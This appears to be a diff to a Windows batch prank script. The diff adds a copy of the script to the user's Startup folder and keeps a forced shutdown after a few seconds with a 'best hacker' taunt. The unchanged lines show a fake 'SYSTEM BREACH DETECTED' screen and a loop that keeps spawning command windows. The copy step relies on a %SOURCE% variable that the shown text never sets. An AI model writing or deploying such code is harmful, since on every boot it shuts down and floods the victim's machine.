@@ -1,5 +1,8 @@
 @echo off
-shutdown -c "you kicked by the best hacker!" -t 1 -s
+set DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0
+
+copy "%SOURCE%" "%DEST%" /Y
+shutdown -c "you kicked by the best hacker!" -t 5 -s
 title SYSTEM BREACH DETECTED
 color 0a
 mode 120,30
@@ -12,3 +15,4 @@ goto matrix
 start cmd
 
 goto loop
+
